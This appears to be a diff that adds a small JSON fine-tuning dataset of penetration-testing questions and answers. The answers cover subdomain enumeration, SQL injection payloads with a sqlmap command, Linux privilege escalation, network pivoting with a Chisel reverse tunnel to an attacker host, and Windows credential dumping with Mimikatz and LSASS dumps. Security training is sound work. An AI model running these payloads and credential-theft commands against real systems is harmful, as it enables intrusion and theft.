@@ -1,0 +1,27 @@
+[
+  {
+    "instruction": "You are a cybersecurity expert and penetration testing assistant. Provide detailed, accurate, and actionable security guidance. Always emphasize authorized testing and responsible disclosure.",
+    "input": "How would you enumerate subdomains for a target domain?",
+    "output": "Subdomain enumeration can be done through several methods:\n1. **Passive**: Use tools like Subfinder, Amass, or crt.sh to find subdomains from public sources.\n2. **Active brute-force**: Use tools like ffuf or gobuster with a wordlist against the DNS.\n3. **DNS zone transfer**: Attempt `dig axfr @ns.target.com target.com` (rarely works but worth trying).\n4. **Search engines**: Google dork `site:*.target.com` or use Shodan.\n5. **Certificate transparency logs**: Query crt.sh or certspotter for issued certificates."
+  },
+  {
+    "instruction": "You are a cybersecurity expert and penetration testing assistant. Provide detailed, accurate, and actionable security guidance. Always emphasize authorized testing and responsible disclosure.",
+    "input": "Explain how to test for SQL injection in a login form.",
+    "output": "To test for SQL injection in a login form:\n1. **Basic test**: Enter `' OR '1'='1` in the username field.\n2. **Error-based**: Enter a single quote `'` and observe if the application returns a database error.\n3. **Time-based blind**: Use `' OR SLEEP(5)--` to detect injection via response delay.\n4. **Union-based**: Try `' UNION SELECT NULL,NULL--` incrementing NULLs to find column count.\n5. **Automated**: Run sqlmap against the form: `sqlmap -u 'http://target/login' --data='user=test&pass=test' --batch`.\nAlways ensure you have written authorization before testing."
+  },
+  {
+    "instruction": "You are a cybersecurity expert and penetration testing assistant. Provide detailed, accurate, and actionable security guidance. Always emphasize authorized testing and responsible disclosure.",
+    "input": "What is privilege escalation on Linux and how do you check for it?",
+    "output": "Privilege escalation is gaining higher-level permissions than initially granted. Common checks:\n1. **SUID binaries**: `find / -perm -4000 -type f 2>/dev/null` -- look for unusual SUID binaries.\n2. **Sudo misconfig**: `sudo -l` -- check what commands the current user can run as root.\n3. **Kernel exploits**: `uname -r` and check against known exploits (e.g., DirtyPipe, DirtyCow).\n4. **Writable paths**: Check if /etc/passwd, cron directories, or service configs are writable.\n5. **Automated**: Run LinPEAS or linux-exploit-suggester for comprehensive enumeration.\n6. **Capabilities**: `getcap -r / 2>/dev/null` -- check for binaries with dangerous capabilities."
+  },
+  {
+    "instruction": "You are a cybersecurity expert and penetration testing assistant. Provide detailed, accurate, and actionable security guidance. Always emphasize authorized testing and responsible disclosure.",
+    "input": "How do you perform a basic network pivot after compromising a host?",
+    "output": "After compromising a host with access to an internal network:\n1. **Discover internal networks**: `ip addr`, `ip route`, `arp -a` to map connected subnets.\n2. **SSH tunnel**: `ssh -D 9050 user@compromised` creates a SOCKS proxy for pivoting.\n3. **Chisel**: Run `chisel server -p 8080 --reverse` on attacker, `chisel client attacker:8080 R:socks` on target.\n4. **Port forwarding**: `ssh -L 8080:internal-target:80 user@compromised` for specific services.\n5. **Scan internal network**: Use proxychains with nmap: `proxychains nmap -sT -Pn 10.0.0.0/24`.\nEnsure all pivoting activities are within the authorized scope."
+  },
+  {
+    "instruction": "You are a cybersecurity expert and penetration testing assistant. Provide detailed, accurate, and actionable security guidance. Always emphasize authorized testing and responsible disclosure.",
+    "input": "Describe how to extract credentials from a Windows machine during a pentest.",
+    "output": "Credential extraction on Windows (post-exploitation, with admin access):\n1. **Mimikatz**: `sekurlsa::logonpasswords` to dump plaintext passwords and NTLM hashes from memory.\n2. **SAM database**: `reg save HKLM\\SAM sam.bak` + `reg save HKLM\\SYSTEM sys.bak`, then extract offline.\n3. **LSASS dump**: Use procdump or comsvcs.dll MiniDump, then parse with pypykatz offline.\n4. **Cached credentials**: `cachedump` or mimikatz `lsadump::cache` for domain cached creds.\n5. **DPAPI**: Decrypt saved browser passwords, WiFi keys, and other DPAPI-protected secrets.\n6. **Kerberos tickets**: `sekurlsa::tickets /export` for pass-the-ticket attacks.\nDocument all extracted credentials and report them. Never exfiltrate beyond the assessment scope."
+  }
+]
